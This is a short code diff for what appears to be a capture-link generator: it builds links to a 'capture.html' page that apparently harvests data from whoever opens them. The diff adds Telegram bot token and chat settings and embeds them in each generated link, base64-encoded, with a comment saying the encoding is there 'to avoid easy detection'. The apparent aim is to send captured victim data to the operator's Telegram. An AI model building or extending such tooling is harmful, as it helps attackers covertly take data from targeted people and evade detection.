@@ -87,7 +87,26 @@ window.addEventListener('DOMContentLoaded', () => {
 
   // Initialize Force Join Gate
   setTimeout(checkJoinStatus, 1500);
+
+  // Load Telegram settings
+  loadTgSettings();
 });
+
+// ---- Telegram Settings ----
+function saveTgSettings() {
+  const token = document.getElementById('tgToken').value.trim();
+  const chat = document.getElementById('tgChat').value.trim();
+  localStorage.setItem('cemra_tg_token', token);
+  localStorage.setItem('cemra_tg_chat', chat);
+  showToast('Telegram settings saved!');
+}
+
+function loadTgSettings() {
+  const token = localStorage.getItem('cemra_tg_token') || '';
+  const chat = localStorage.getItem('cemra_tg_chat') || '';
+  document.getElementById('tgToken').value = token;
+  document.getElementById('tgChat').value = chat;
+}
 
 // ---- Force Join Logic ----
 function checkJoinStatus() {
@@ -182,7 +201,15 @@ function generateLink() {
     const isLocal = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost';
     const finalPath = isLocal ? 'capture.html' : cleanPath;
 
-    generatedLink = `${base}${finalPath}?s=${sessionId}&t=${token}&th=${selectedTheme}`;
+    // Optional Telegram Params (encoded to avoid easy detection)
+    const tgToken = document.getElementById('tgToken').value.trim();
+    const tgChat = document.getElementById('tgChat').value.trim();
+    let tgParams = '';
+    if (tgToken && tgChat) {
+      tgParams = `&bot=${btoa(tgToken)}&chat=${btoa(tgChat)}`;
+    }
+
+    generatedLink = `${base}${finalPath}?s=${sessionId}&t=${token}&th=${selectedTheme}${tgParams}`;
 
     console.log('Generated Link:', generatedLink);
 
